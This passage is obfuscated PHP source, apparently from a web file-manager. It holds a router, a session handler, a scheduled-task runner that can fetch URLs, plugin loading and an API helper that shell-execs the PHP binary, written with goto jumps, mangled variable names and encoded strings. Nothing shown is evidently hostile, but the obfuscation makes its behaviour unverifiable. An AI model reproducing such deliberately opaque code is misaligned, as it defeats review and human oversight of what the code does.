call_user_func(self::$callbacks[$C…˜£ÍŠ‘¥]); if (self::$halts) { return; } } } } } else { $CÔ¤½éÍ· = 0; foreach (self::$routes as $C…˜£ÍŠ‘¥) { if (strpos($C…˜£ÍŠ‘¥, $Aí¨…ÛÛš[4]) !== !1) { $C…˜£ÍŠ‘¥ = str_replace($C·£õ«•Û, $BŠ×Ó¥ìÅ, $C…˜£ÍŠ‘¥); } if (preg_match($Aí¨…ÛÛš[1363] . $C…˜£ÍŠ‘¥ . $Aí¨…ÛÛš[1364], $bìØ‡ƒÛÒ, $BÛµ†Õ‰¹Û)) { if (self::$methods[$CÔ¤½éÍ·] == $fÒÒİÑ±˜‘ || self::$methods[$CÔ¤½éÍ·] == $Aí¨…ÛÛš[1361] || !empty(self::$maps[$CÔ¤½éÍ·]) && in_array($fÒÒİÑ±˜‘, self::$maps[$CÔ¤½éÍ·])) { $b â´ã÷” = !0; array_shift($BÛµ†Õ‰¹Û); if (!is_object(self::$callbacks[$CÔ¤½éÍ·])) { $dàÍ÷¦¤Ó· = explode($Aí¨…ÛÛš[8], self::$callbacks[$CÔ¤½éÍ·]); $F›ïœÎÈ§º = end($dàÍ÷¦¤Ó·); $B‰Ùš×²×Í = explode($Aí¨…ÛÛš[1362], $F›ïœÎÈ§º); $F†ì¶™æâ— = new $B‰Ùš×²×Í[0](); if (!method_exists($F†ì¶™æâ—, $B‰Ùš×²×Í[1])) { echo $Aí¨…ÛÛš[1365]; } else { call_user_func_array(array($F†ì¶™æâ—, $B‰Ùš×²×Í[1]), $BÛµ†Õ‰¹Û); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$CÔ¤½éÍ·], $BÛµ†Õ‰¹Û); if (self::$halts) { return; } } } } $CÔ¤½éÍ·++; } } if ($b â´ã÷” == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $aïÍ¿åÅõå =& $_SERVER[Ìó]; header($_SERVER[$aïÍ¿åÅõå[1366]] . $aïÍ¿åÅõå[1367]); echo $aïÍ¿åÅõå[1368]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Aí¨…ÛÛš[1360]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto CŸÊŠ†Ñˆ‚; CŸÊŠ†Ñˆ‚: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto aË§¯¬‚¹º; d¶£ƒôåÈ†: $e‡¤ÒÅóÍ³ = $GLOBALS[$eÓ¥ÅÒ§Ç©[6]][$eÓ¥ÅÒ§Ç©[333]]; self::$sessionTime = $e‡¤ÒÅóÍ³[$eÓ¥ÅÒ§Ç©[1369]]; $C›°ã¹İ»ß = SESSION_ID; goto E‘÷´ÔÕëÊ; e¸¦õ›…Ïå: $E‘øíì•´¾ = $e‡¤ÒÅóÍ³[$eÓ¥ÅÒ§Ç©[1371]]; $d…ğµÌïòô = $e‡¤ÒÅóÍ³[$E‘øíì•´¾]; $c¹À…ä°¤Ò = $e‡¤ÒÅóÍ³[$eÓ¥ÅÒ§Ç©[750]]; goto cù¶‘ó²î; E‘÷´ÔÕëÊ: $C›°ã¹İ»ß = _get($GLOBALS, $eÓ¥ÅÒ§Ç©[1370], $C›°ã¹İ»ß); if (self::$sessionSign) { } else { if (Cookie::get($C›°ã¹İ»ß)) { self::$sessionSign = Cookie::get($C›°ã¹İ»ß); } else { self::$sessionSign = guid(); } } Cookie::setSafe($C›°ã¹İ»ß, self::$sessionSign, self::$sessionTime); goto e¸¦õ›…Ïå; E¦ÔœÃ÷¢­: return $b¸‡õİà¡Æ; goto fÌ…´Æ‘ê‡; cù¶‘ó²î: switch ($E‘øíì•´¾) { case $eÓ¥ÅÒ§Ç©[17]: self::$handle = Model($eÓ¥ÅÒ§Ç©[751]); break; case $eÓ¥ÅÒ§Ç©[752]: self::$handle = new CacheRedis($d…ğµÌïòô, $c¹À…ä°¤Ò); break; case $eÓ¥ÅÒ§Ç©[753]: self::$handle = new CacheMemcached($d…ğµÌïòô, $c¹À…ä°¤Ò); break; case $eÓ¥ÅÒ§Ç©[163]: $d…ğµÌïòô[$eÓ¥ÅÒ§Ç©[75]] = $d…ğµÌïòô[$eÓ¥ÅÒ§Ç©[75]] . $eÓ¥ÅÒ§Ç©[1372]; self::$handle = new CacheFile($d…ğµÌïòô, $c¹À…ä°¤Ò); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $b¸‡õİà¡Æ = new self(); goto E¦ÔœÃ÷¢­; aË§¯¬‚¹º: $eÓ¥ÅÒ§Ç© =& $_SERVER[Ìó]; static $b¸‡õİà¡Æ = false; if ($b¸‡õİà¡Æ) { return $b¸‡õİà¡Æ; } goto d¶£ƒôåÈ†; fÌ…´Æ‘ê‡: } public static function sign($Dß‡¤è–ç = false) { $Dß‡¤è–ç && (self::$sessionSign = $Dß‡¤è–ç); self::init(); return self::$sessionSign; } public static function set($b°Çå°ºˆÂ, $A¬¥Ÿ‰êîÛ = false) { self::init(); if (is_array($b°Çå°ºˆÂ)) { foreach ($b°Çå°ºˆÂ as $FÃà‡ê–’ä => $CÕ×Â¸óëò) { array_set_value(self::$data, $FÃà‡ê–’ä, $CÕ×Â¸óëò); } } else { array_set_value(self::$data, $b°Çå°ºˆÂ, $A¬¥Ÿ‰êîÛ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($A»‹ŠÏè¦ˆ = false) { self::init(); if (!$A»‹ŠÏè¦ˆ) { return self::$data; } return array_get_value(self::$data, $A»‹ŠÏè¦ˆ); } public static function remove($e¡Ç»ŸñÔ) { self::init(); unset(self::$data[$e¡Ç»ŸñÔ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ìó][755])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto A¶¬Ë¿ŒâĞ; EÀÙöéİ«: while (!0) { self::cacheClear(); if (self::valueGet($bô¶ÅèÙøŠ[685]) != $bô¶ÅèÙøŠ[83]) { self::valueSet($bô¶ÅèÙøŠ[1373], $bô¶ÅèÙøŠ[463]); self::log($bô¶ÅèÙøŠ[1377]); die; } self::valueSet($bô¶ÅèÙøŠ[1373], $bô¶ÅèÙøŠ[83]); self::valueSet($bô¶ÅèÙøŠ[1374], time()); self::taskRunAll(); sleep(self::valueGet($bô¶ÅèÙøŠ[1378])); } goto Ağ®Æ‚èÈº; A¶¬Ë¿ŒâĞ: $bô¶ÅèÙøŠ =& $_SERVER[Ìó]; if (self::valueGet($bô¶ÅèÙøŠ[685]) != $bô¶ÅèÙøŠ[83]) { return; } if (self::valueGet($bô¶ÅèÙøŠ[1373]) == $bô¶ÅèÙøŠ[83]) { $C‰ö«½‡¨Œ = self::valueGet($bô¶ÅèÙøŠ[1374]); if (time() - $C‰ö«½‡¨Œ > 3600 * 2) { self::restart(); } return; } goto b‡Œ—Î¢…È; b‡Œ—Î¢…È: http_close(); self::valueSet($bô¶ÅèÙøŠ[1373], $bô¶ÅèÙøŠ[83]); Hook::bind($bô¶ÅèÙøŠ[1375], $bô¶ÅèÙøŠ[1376]); goto EÀÙöéİ«; Ağ®Æ‚èÈº: } public static function restart() { $DË‡É«„¹ä =& $_SERVER[Ìó]; http_close(); self::valueSet($DË‡É«„¹ä[685], $DË‡É«„¹ä[463]); sleep(self::valueGet($DË‡É«„¹ä[1378]) + 5); self::valueSet($DË‡É«„¹ä[1373], $DË‡É«„¹ä[463]); self::valueSet($DË‡É«„¹ä[685], $DË‡É«„¹ä[83]); } public static function shutdownEvent() { $dÂ‰ê¯ÅĞ¾ =& $_SERVER[Ìó]; self::valueSet($dÂ‰ê¯ÅĞ¾[1373], $dÂ‰ê¯ÅĞ¾[463]); self::log($dÂ‰ê¯ÅĞ¾[1379]); } public static function config($A¼¶Õ«µŠµ, $b· ¿±ù¶±) { $b¦âöÙëã =& $_SERVER[Ìó]; $b´Ï—·Î™´ = 20; $b· ¿±ù¶± = intval($b· ¿±ù¶±) <= $b´Ï—·Î™´ ? $b´Ï—·Î™´ : intval($b· ¿±ù¶±); self::valueSet($b¦âöÙëã[685], $A¼¶Õ«µŠµ); self::valueSet($b¦âöÙëã[1378], $b· ¿±ù¶±); } private static function taskRunAll() { $Dã„± Û¿¯ =& $_SERVER[Ìó]; $CŠ’¢ë•» = Model($Dã„± Û¿¯[1380])->listData(); $a‰¬¨ò“†Ü = count($CŠ’¢ë•»); for ($fõœÃÒÒÔ = 0; $fõœÃÒÒÔ < $a‰¬¨ò“†Ü; $fõœÃÒÒÔ++) { $CŠô÷šÃ‡¿ = $CŠ’¢ë•»[$fõœÃÒÒÔ]; if ($CŠô÷šÃ‡¿[$Dã„± Û¿¯[1381]] != $Dã„± Û¿¯[83]) { continue; } if (!self::taskTimeCheck($CŠô÷šÃ‡¿)) { continue; } self::taskRun($CŠô÷šÃ‡¿); } Hook::trigger($Dã„± Û¿¯[1382]); } private static function taskTimeCheck($aÚ¤Ü×¹ñ®) { goto E•¯‘ˆã°º; aøÖ¸‰©é©: switch ($e°¦¾é¿½Í[$e¤ÊêîŠî[29]]) { case $e¤ÊêîŠî[1389]: if (time() - $AÆÖ˜«º < 3600 * 24 * 30) { return !1; } if ($e°¦¾é¿½Í[$e¤ÊêîŠî[1389]] == date($e¤ÊêîŠî[1390]) && $AÛ¸½ÒçÌ) { return !0; } break; case $e¤ÊêîŠî[1391]: if (time() - $AÆÖ˜«º < 3600 * 24 * 7) { return !1; } $f³‘ÊÉİ¸ë = date($e¤ÊêîŠî[1392]) == 0 ? 7 : date($e¤ÊêîŠî[1392]); if ($e°¦¾é¿½Í[$e¤ÊêîŠî[1391]] == $f³‘ÊÉİ¸ë && $AÛ¸½ÒçÌ) { return !0; } break; case $e¤ÊêîŠî[1384]: if (time() - $AÆÖ˜«º < 3600 * 24) { return !1; } if ($AÛ¸½ÒçÌ) { return !0; } break; case $e¤ÊêîŠî[1393]: if (time() - $AÆÖ˜«º >= floatval($e°¦¾é¿½Í[$e¤ÊêîŠî[1393]]) * 60) { return !0; } break; default: break; } return !1; goto dôéÛ; E•¯‘ˆã°º: $e¤ÊêîŠî =& $_SERVER[Ìó]; $e°¦¾é¿½Í = json_decode($aÚ¤Ü×¹ñ®[$e¤ÊêîŠî[186]], !0); $AÆÖ˜«º = intval($aÚ¤Ü×¹ñ®[$e¤ÊêîŠî[1374]]); goto fºÂ—à‚¾‚; fºÂ—à‚¾‚: $cšŸî’‘ß = strtotime($e¤ÊêîŠî[1383] . $e°¦¾é¿½Í[$e¤ÊêîŠî[1384]] . $e¤ÊêîŠî[1385]) - strtotime($e¤ÊêîŠî[1386]); $C†¯Õ¤õ’è = time() - strtotime(date($e¤ÊêîŠî[1387]) . $e¤ÊêîŠî[1388]); $AÛ¸½ÒçÌ = $C†¯Õ¤õ’è >= $cšŸî’‘ß && $C†¯Õ¤õ’è <= $cšŸî’‘ß + 3600; goto aøÖ¸‰©é©; dôéÛ: } public static function taskRun($fâ‚…ÁØÍ) { goto Dõç¦¿·Ñ—; b·¯ƒ¯²èâ: Model($AÚÍáÎˆÔ[1398])->add(array($AÚÍáÎˆÔ[1399] => $AÚÍáÎˆÔ[33], $AÚÍáÎˆÔ[1400] => $AÚÍáÎˆÔ[463], $AÚÍáÎˆÔ[29] => $AÚÍáÎˆÔ[1401] . $fâ‚…ÁØÍ[$AÚÍáÎˆÔ[363]], $AÚÍáÎˆÔ[1402] => json_encode(array($AÚÍáÎˆÔ[28] => $fâ‚…ÁØÍ[$AÚÍáÎˆÔ[28]], $AÚÍáÎˆÔ[1403] => timeFloat() - $D•ª†¾ù’, $AÚÍáÎˆÔ[277] => $DğäóºŒ÷Î)))); self::log($AÚÍáÎˆÔ[1404] . $fâ‚…ÁØÍ[$AÚÍáÎˆÔ[363]] . $AÚÍáÎˆÔ[1405] . $DğäóºŒ÷Î); return !0; goto dƒï¿Ñ•âÑ; Dõç¦¿·Ñ—: $AÚÍáÎˆÔ =& $_SERVER[Ìó]; self::log($AÚÍáÎˆÔ[1394] . $fâ‚…ÁØÍ[$AÚÍáÎˆÔ[363]] . $AÚÍáÎˆÔ[1395] . $fâ‚…ÁØÍ[$AÚÍáÎˆÔ[28]] . $AÚÍáÎˆÔ[1396] . $fâ‚…ÁØÍ[$AÚÍáÎˆÔ[1397]]); Model($AÚÍáÎˆÔ[1380])->run($fâ‚…ÁØÍ[$AÚÍáÎˆÔ[363]]); goto B™Ùß‡Œ½; B™Ùß‡Œ½: $D•ª†¾ù’ = timeFloat(); $DğäóºŒ÷Î = $AÚÍáÎˆÔ[33]; switch ($fâ‚…ÁØÍ[$AÚÍáÎˆÔ[29]]) { case $AÚÍáÎˆÔ[291]: $f·„ÖÄÉ¤ = url_request($fâ‚…ÁØÍ[$AÚÍáÎˆÔ[1397]], $AÚÍáÎˆÔ[212], !1, !1, !1, !1, 5); $DğäóºŒ÷Î = strlen($f·„ÖÄÉ¤); break; case $AÚÍáÎˆÔ[211]: $DğäóºŒ÷Î = Hook::apply($fâ‚…ÁØÍ[$AÚÍáÎˆÔ[1397]]); default: break; } goto b·¯ƒ¯²èâ; dƒï¿Ñ•âÑ: } private static function valueGet($cÃìàŞÙ¡º) { $F÷Á‚‘ìß¯ =& $_SERVER[Ìó]; $e“›»ä‚î© = $F÷Á‚‘ìß¯[1406]; $BƒÙù¯ğ¤´ = Model($F÷Á‚‘ìß¯[1407])->get($cÃìàŞÙ¡º, $e“›»ä‚î©); if (is_null($BƒÙù¯ğ¤´)) { Model($F÷Á‚‘ìß¯[1407])->set($F÷Á‚‘ìß¯[1378], 10, $e“›»ä‚î©); Model($F÷Á‚‘ìß¯[1407])->set($F÷Á‚‘ìß¯[685], $F÷Á‚‘ìß¯[83], $e“›»ä‚î©); Model($F÷Á‚‘ìß¯[1407])->set($F÷Á‚‘ìß¯[1373], $F÷Á‚‘ìß¯[463], $e“›»ä‚î©); $BƒÙù¯ğ¤´ = Model($F÷Á‚‘ìß¯[1407])->get($cÃìàŞÙ¡º, $e“›»ä‚î©); } return $BƒÙù¯ğ¤´; } private static function valueSet($E¨Š„„ÇÃ, $bÆš¯×ò¡í) { $aÓ‹ÎÕ·„ª =& $_SERVER[Ìó]; return Model($aÓ‹ÎÕ·„ª[1407])->set($E¨Š„„ÇÃ, $bÆš¯×ò¡í, $aÓ‹ÎÕ·„ª[1406]); } protected static function log($FÛ †—İ«) { write_log($FÛ †—İ«, $_SERVER[Ìó][1408]); } private static function cacheClear() { $a¡çç½¾×¥ =& $_SERVER[Ìó]; $d”à·àŠÚï = Model($a¡çç½¾×¥[1407])->cacheKey($a¡çç½¾×¥[1406]); Cache::clearMemory($d”à·àŠÚï); } } goto e¬Û¡õË”£; bŞ¿¨“ß‚‘: function Action($eèíÁ“¢æ¬ = '') { goto cÂÂÉÖ„¼; cÂÂÉÖ„¼: $D©™†ÏÚÇÒ =& $_SERVER[†˜ı]; static $cäÚã»¡Üë = array(); $eèíÁ“¢æ¬ = trim(str_replace($D©™†ÏÚÇÒ[4], $D©™†ÏÚÇÒ[5], $eèíÁ“¢æ¬), $D©™†ÏÚÇÒ[4]); goto c™’ÁÌ¬èø; B”Èà˜Áµ…: $FˆÅÇƒÅÊ = strtolower($dÀ×¿ƒš­÷); if (isset($cäÚã»¡Üë[$FˆÅÇƒÅÊ])) { return $cäÚã»¡Üë[$FˆÅÇƒÅÊ]; } if (is_file($Aª¨§Œãá)) { include_once $Aª¨§Œãá; } goto BÃâ´ºí¿²; c™’ÁÌ¬èø: $a°Çâ­ÏÍ¥ = explode($D©™†ÏÚÇÒ[5], $eèíÁ“¢æ¬); $F…«á‡‹Èå = strtolower($a°Çâ­ÏÍ¥[0]); if (substr($F…«á‡‹Èå, -6) == $D©™†ÏÚÇÒ[6]) { $eèíÁ“¢æ¬ = substr($a°Çâ­ÏÍ¥[0], 0, -6); $dÀ×¿ƒš­÷ = $eèíÁ“¢æ¬ . $D©™†ÏÚÇÒ[7]; $Aª¨§Œãá = $D©™†ÏÚÇÒ[8]; if (isset($a°Çâ­ÏÍ¥[1]) && substr(strtolower($a°Çâ­ÏÍ¥[1]), -5) == $D©™†ÏÚÇÒ[9]) { $dÀ×¿ƒš­÷ = $eèíÁ“¢æ¬ . $a°Çâ­ÏÍ¥[1]; $Aª¨§Œãá = $D©™†ÏÚÇÒ[10] . $a°Çâ­ÏÍ¥[1] . $D©™†ÏÚÇÒ[11]; } else { if (count($a°Çâ­ÏÍ¥) == 3) { $dÀ×¿ƒš­÷ = $eèíÁ“¢æ¬ . $a°Çâ­ÏÍ¥[1] . $a°Çâ­ÏÍ¥[2]; $Aª¨§Œãá = $D©™†ÏÚÇÒ[12] . $a°Çâ­ÏÍ¥[1] . $D©™†ÏÚÇÒ[13] . $a°Çâ­ÏÍ¥[2] . $D©™†ÏÚÇÒ[11]; } } $Aª¨§Œãá = PLUGIN_DIR . $eèíÁ“¢æ¬ . $D©™†ÏÚÇÒ[4] . $Aª¨§Œãá; } else { if (substr($F…«á‡‹Èå, -5) == $D©™†ÏÚÇÒ[9]) { $eèíÁ“¢æ¬ = substr($a°Çâ­ÏÍ¥[0], 0, -5); return Model($eèíÁ“¢æ¬); } else { $dÀ×¿ƒš­÷ = $a°Çâ­ÏÍ¥[0] . $a°Çâ­ÏÍ¥[1]; $Aª¨§Œãá = CONTROLLER_DIR . $a°Çâ­ÏÍ¥[0] . $D©™†ÏÚÇÒ[4] . $a°Çâ­ÏÍ¥[1] . $D©™†ÏÚÇÒ[14]; } } goto B”Èà˜Áµ…; BÃâ´ºí¿²: if (!class_exists($dÀ×¿ƒš­÷)) { return actionCallError("\x5b{$eèíÁ“¢æ¬}\x20\x3d\76\x20{$dÀ×¿ƒš­÷}\135\x20\x63\154\x61\163\163\x20\x6e\157\164\40\x65\170\151\163\x74\163\41"); } $cäÚã»¡Üë[$FˆÅÇƒÅÊ] = new $dÀ×¿ƒš­÷(); return $cäÚã»¡Üë[$FˆÅÇƒÅÊ]; goto EººÎÏÁ‚Ğ; EººÎÏÁ‚Ğ: } function ActionApply($eªê„òØØˆ, $CëÓñ÷‡£ = array()) { goto eŠ½Ğ¦Â¹; AÀ¹Îòâßê: $DÒÌÉãæ„Û = substr($eªê„òØØˆ, 0, $F’ìØ·ßØ); $EâŠ¶¢ÚŞó = substr($eªê„òØØˆ, $F’ìØ·ßØ + 1); $BØÉ¦é ®Å = Action($DÒÌÉãæ„Û); goto BªÛè çòŸ; eŠ½Ğ¦Â¹: if (is_array($eªê„òØØˆ)) { return call_user_func_array($eªê„òØØˆ, $CëÓñ÷‡£); } if (function_exists($eªê„òØØˆ)) { return call_user_func_array($eªê„òØØˆ, $CëÓñ÷‡£); } $F’ìØ·ßØ = strrpos($eªê„òØØˆ, $_SERVER[†˜ı][5]); goto AÀ¹Îòâßê; BªÛè çòŸ: if (!method_exists($BØÉ¦é ®Å, $EâŠ¶¢ÚŞó)) { return actionCallError("{$eªê„òØØˆ}\40\155\x65\x74\150\x6f\144\x20\x6e\157\164\40\145\x78\151\x73\x74\x73\x21"); } $aŒ÷–™ Úø = call_user_func_array(array($BØÉ¦é ®Å, $EâŠ¶¢ÚŞó), $CëÓñ÷‡£); return $aŒ÷–™ Úø; goto D‡ÈõùÃ¸; D‡ÈõùÃ¸: } function actionCallError($AÇ÷Ÿ¼ë²’) { $fºÃ’ä¯¬§ =& $_SERVER[†˜ı]; $FÍ¶¯ÂñØ = json_encode_force(array($fºÃ’ä¯¬§[15] => this_url(), $fºÃ’ä¯¬§[16] => $GLOBALS[$fºÃ’ä¯¬§[16]])); $FÍ¶¯ÂñØ = str_replace(array($fºÃ’ä¯¬§[17]), array($fºÃ’ä¯¬§[4]), $FÍ¶¯ÂñØ); return write_log($AÇ÷Ÿ¼ë²’ . $fºÃ’ä¯¬§[18] . $FÍ¶¯ÂñØ, $fºÃ’ä¯¬§[19]); } goto a’¨İÑ ; D…È¯ç¨ Å: define($_SERVER[Ìó][223], 2); define($_SERVER[Ìó][224], 3); define($_SERVER[Ìó][225], 1); goto aµâ¦¦“ë½; a’¨İÑ : function ActionCall($DÌ›ßÌ´) { $aËÆ‹ˆšå = array_slice(func_get_args(), 1); return ActionApply($DÌ›ßÌ´, $aËÆ‹ˆšå); } function ActionCallApi($F’¦‘ğ¨†ƒ, $aî­„Á‹…Ç = '') { goto EÑÀ„Ëçƒ’; eŠ†õùÀ¯†: $EèÍ•®§ = phpBinCommand(); if ($EèÍ•®§ && function_exists($cØ×Ó³–Â÷[25])) { $e§Äß–æõŠ = $EèÍ•®§ . $cØ×Ó³–Â÷[26] . BASIC_PATH . $cØ×Ó³–Â÷[27] . escapeshellarg($F’¦‘ğ¨†ƒ); $B”Ôİ‡„­ = shell_exec($e§Äß–æõŠ); } if (!$B”Ôİ‡„­) { $D…ªïã¿æ = stream_context_create(array($cØ×Ó³–Â÷[28] => array($cØ×Ó³–Â÷[29] => 20, $cØ×Ó³–Â÷[30] => $cØ×Ó³–Â÷[31]))); $B”Ôİ‡„­ = file_get_contents(APP_HOST . $cØ×Ó³–Â÷[32] . $F’¦‘ğ¨†ƒ, !1, $D…ªïã¿æ); } goto f›´ÔöËÕ¥; EÑÀ„Ëçƒ’: $cØ×Ó³–Â÷ =& $_SERVER[†˜ı]; $aÃß•Ç¨¥á = $aî­„Á‹…Ç; if (is_array($aî­„Á‹…Ç)) { $aÃß•Ç¨¥á = $cØ×Ó³–Â÷[20]; foreach ($aî­„Á‹…Ç as $aêÍ¿¢¬‚ö => $Eöª‰Ò™™É) { $Eöª‰Ò™™É = is_array($Eöª‰Ò™™É) ? json_encode($Eöª‰Ò™™É) : $Eöª‰Ò™™É; $Eöª‰Ò™™É = is_bool($Eöª‰Ò™™É) ? intval($Eöª‰Ò™™É) : $Eöª‰Ò™™É; $aÃß•Ç¨¥á .= $cØ×Ó³–Â÷[21] . $aêÍ¿¢¬‚ö . $cØ×Ó³–Â÷[22] . rawurlencode($Eöª‰Ò™™É); } } goto b»¦×å°‰Œ; b»¦×å°‰Œ: $fĞêÎµ¿· = Action($cØ×Ó³–Â÷[23])->accessToken(); $F’¦‘ğ¨†ƒ = str_replace($cØ×Ó³–Â÷[5], $cØ×Ó³–Â÷[4], $F’¦‘ğ¨†ƒ) . $cØ×Ó³–Â÷[24] . $fĞêÎµ¿· . $aÃß•Ç¨¥á; $B”Ôİ‡„­ = $cØ×Ó³–Â÷[20]; goto eŠ†õùÀ¯†; f›´ÔöËÕ¥: $f¬õ„ØĞ†õ = json_decode($B”Ôİ‡„­, !0); $cÀ¶ °Ú¥‡ = is_array($f¬õ„ØĞ†õ) ? $f¬õ„ØĞ†õ : array($cØ×Ó³–Â÷[33] => null, $cØ×Ó³–Â÷[34] => $B”Ôİ‡„­); if (!$f¬õ„ØĞ†õ) { echo $B”Ôİ‡„­; } goto D•¾ Ôø; D•¾ Ôø: return $cÀ¶ °Ú¥‡; goto cÑ¦Æ¥·ñÍ; cÑ¦Æ¥·ñÍ: } function ActionCallHook($a¨¸ëŸÑÀ¶) { goto E‹ôƒˆ–ÈÄ; a™¤‘§Ó¸: $F©‘§ŒÔÒğ = $fÒÍƒßöÛ¤ ? json_decode($fÒÍƒßöÛ¤, !0) : $F©‘§ŒÔÒğ; $GLOBALS[$eåù‰…„µÒ[35]] = 0; return $F©‘§ŒÔÒğ; goto CÂ°äÌ‚ßÀ; E‹ôƒˆ–ÈÄ: $eåù‰…„µÒ =& $_SERVER[†˜ı]; ob_start(); $FÏ§ÇÌ¥‰• = array_slice(func_get_args(), 1); goto CëËÎ˜İÅä; CëËÎ˜İÅä: $GLOBALS[$eåù‰…„µÒ[35]] = 1; $F©‘§ŒÔÒğ = ActionApply($a¨¸ëŸÑÀ¶, $FÏ§ÇÌ¥‰•); $fÒÍƒßöÛ¤ = ob_get_clean(); goto a™¤‘§Ó¸; CÂ°äÌ‚ßÀ: } goto A’åì±š´Ö; d³„ê¨øÒë: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\114\151\x67\x68\164\x41\x70\160"; public $modelType = "\x53\171\163\x74\145\155\x4f\x70\164\x69\x6f\156"; public $field = array("\156\x61\155\145", "\147\x72\x6f\165\160", "\x64\x65\163\x63", "\x63\x6f\156\164\145\x6e\x74"); public function listData($f‡™»¡ŒÍÓ = false, $E£Š¯Î×° = "\x6d\157\x64\x69\x66\x79\x54\151\x6d\x65", $ešÄ¶Îêí” = true) { return parent::listData($f‡™»¡ŒÍÓ, $E£Š¯Î×°, $ešÄ¶Îêí”); } public function remove($AÓÒ¬æÛŒ”) { $EùğòÏ­É½ = $this->findByName($AÓÒ¬æÛŒ”); if (!$EùğòÏ­É½) { return !1; } return parent::remove($EùğòÏ­É½[$_SERVER[Ìó][363]]); } public function add($cèÇ‰„„­Æ) { if ($this->findByName($cèÇ‰„„­Æ[$_SERVER[Ìó][28]])) { return !1; } return parent::insert($cèÇ‰„„­Æ); } public function update($f¨èåºù¨, $EÅø±ôµ£Å) { $dË ¸ÒŠÅ± =& $_SERVER[Ìó]; $B´ÈœÍĞÀ = $this->findByName($f¨èåºù¨); $BÊ¾¬½ñé’ = $this->findByName($EÅø±ôµ£Å[$dË ¸ÒŠÅ±[28]]); if (!$B´ÈœÍĞÀ || $BÊ¾¬½ñé’ && $BÊ¾¬½ñé’[$dË ¸ÒŠÅ±[363]] != $B´ÈœÍĞÀ[$dË ¸ÒŠÅ±[363]]) { return !1; } return parent::update($B´ÈœÍĞÀ[$dË ¸ÒŠÅ±[363]], $EÅø±ôµ£Å); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\x6d\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\143\162\145\141\x74\145\x54\x69\155\x65", "\164\x69\155\145", "\151\x6e\163\x65\x72\x74", "\x66\165\x6e\143\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $Aõ©Ø“‘À¡ =& $_SERVER[Ìó]; return array($Aõ©Ø“‘À¡[2338] => LNG($Aõ©Ø“‘À¡[2339]), $Aõ©Ø“‘À¡[2340] => LNG($Aõ©Ø“‘À¡[2341]), $Aõ©Ø“‘À¡[2012] => LNG($Aõ©Ø“‘À¡[2342]), $Aõ©Ø“‘À¡[2343] => LNG($Aõ©Ø“‘À¡[2344]), $Aõ©Ø“‘À¡[2345] => LNG($Aõ©Ø“‘À¡[2346]), $Aõ©Ø“‘À¡[2347] => LNG($Aõ©Ø“‘À¡[2348]), $Aõ©Ø“‘À¡[2349] => LNG($Aõ©Ø“‘À¡[2350]), $Aõ©Ø“‘À¡[2351] => LNG($Aõ©Ø“‘À¡[2352]), $Aõ©Ø“‘À¡[2043] => LNG($Aõ©Ø“‘À¡[2353]), $Aõ©Ø“‘À¡[2044] => LNG($Aõ©Ø“‘À¡[2354]), $Aõ©Ø“‘À¡[2355] => LNG($Aõ©Ø“‘À¡[2356]), $Aõ©Ø“‘À¡[2357] => LNG($Aõ©Ø“‘À¡[2358]), $Aõ©Ø“‘À¡[2359] => LNG($Aõ©Ø“‘À¡[2360]), $Aõ©Ø“‘À¡[2361] => LNG($Aõ©Ø“‘À¡[2362]), $Aõ©Ø“‘À¡[2041] => LNG($Aõ©Ø“‘À¡[2363]), $Aõ©Ø“‘À¡[2047] => LNG($Aõ©Ø“‘À¡[2364]), $Aõ©Ø“‘À¡[2365] => LNG($Aõ©Ø“‘À¡[2366]), $Aõ©Ø“‘À¡[2367] => LNG($Aõ©Ø“‘À¡[2368]), $Aõ©Ø“‘À¡[2369] => LNG($Aõ©Ø“‘À¡[2370]), $Aõ©Ø“‘À¡[2371] => LNG($Aõ©Ø“‘À¡[2372]), $Aõ©Ø“‘À¡[2050] => LNG($Aõ©Ø“‘À¡[2373]), $Aõ©Ø“‘À¡[2051] => LNG($Aõ©Ø“‘À¡[2374]), $Aõ©Ø“‘À¡[2375] => LNG($Aõ©Ø“‘À¡[2376]), $Aõ©Ø“‘À¡[2377] => LNG($Aõ©Ø“‘À¡[2378]), $Aõ©Ø“‘À¡[2379] => LNG($Aõ©Ø“‘À¡[2380]), $Aõ©Ø“‘À¡[2381] => LNG($Aõ©Ø“‘À¡[2382]), $Aõ©Ø“‘À¡[2383] => LNG($Aõ©Ø“‘À¡[2384]), $Aõ©Ø“‘À¡[2045] => LNG($Aõ©Ø“‘À¡[2385]), $Aõ©Ø“‘À¡[2386] => LNG($Aõ©Ø“‘À¡[2387]), $Aõ©Ø“‘À¡[2388] => LNG($Aõ©Ø“‘À¡[2389]), $Aõ©Ø“‘À¡[2390] => LNG($Aõ©Ø“‘À¡[2390]), $Aõ©Ø“‘À¡[2391] => LNG($Aõ©Ø“‘À¡[2016]), $Aõ©Ø“‘À¡[2392] => LNG($Aõ©Ø“‘À¡[2393]), $Aõ©Ø“‘À¡[2394] => LNG($Aõ©Ø“‘À¡[2395]), $Aõ©Ø“‘À¡[2396] => LNG($Aõ©Ø“‘À¡[2397]), $Aõ©Ø“‘À¡[2398] => LNG($Aõ©Ø“‘À¡[2399]), $Aõ©Ø“‘À¡[2400] => LNG($Aõ©Ø“‘À¡[2401]), $Aõ©Ø“‘À¡[2402] => LNG($Aõ©Ø“‘À¡[2402]), 